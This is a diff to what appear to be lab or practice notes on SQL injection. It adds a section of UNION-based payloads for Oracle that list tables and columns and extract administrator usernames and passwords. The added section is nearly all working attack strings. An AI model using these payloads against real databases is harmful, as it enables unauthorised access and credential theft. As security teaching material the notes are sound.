@@ -123,4 +123,19 @@ Then pull out the administrator pass with this:
 ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
 ```
 
+### SQL injection attack, listing the database contents on Oracle
+
+Follow same UNION steps, we are going to assume 2 columns from here instead of repeating the same as above
+
+```
+' UNION SELECT 'abc', 'abc' FROM DUAL--
+Retrieve tables:
+' UNION SELECT table_name, NULL FROM all_tables--
+Find columns on table:
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='users_abcdef'--
+Get Admins password:
+' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
+```
+
 ### 
+
